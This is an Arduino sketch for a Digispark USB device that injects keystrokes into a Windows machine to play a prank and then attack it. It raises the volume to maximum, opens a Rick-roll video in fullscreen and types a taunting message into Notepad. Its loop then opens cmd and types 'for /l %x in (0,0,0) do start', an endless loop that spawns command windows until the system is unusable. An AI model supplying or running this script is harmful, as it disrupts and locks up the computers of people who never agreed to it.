#include "DigiKeyboard.h"
#define KEY_UP     0x52
#define KEY_DOWN   0x51
#define KEY_LEFT   0x50
#define KEY_RIGHT  0x4F
void setup() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("sndvol");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  for (int i=0; i<100; i++) {
    DigiKeyboard.sendKeyStroke(KEY_UP);
    DigiKeyboard.delay(30);
  }
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(4000);
    DigiKeyboard.print("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(5000);
    DigiKeyboard.sendKeyStroke(KEY_F);
    DigiKeyboard.delay(2000);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(3000);
    DigiKeyboard.print("notepad");
    DigiKeyboard.delay(800);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(5000);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);  
    DigiKeyboard.print("but it will come in handy someday (maybe)] sam makes me feels sick! im offended!(probably because i’m jealous of how much is written on that website(i dont even know how to make a website)) I’VE JUST BEEN READING THIS AND I HAVE DISCOVERED A CONSPIRACY! THAT’S RIGHT, I AM WORKING FOR DOCTOR SUESS!");
    DigiKeyboard.delay(1000);
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("COLOR EF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
  }
}
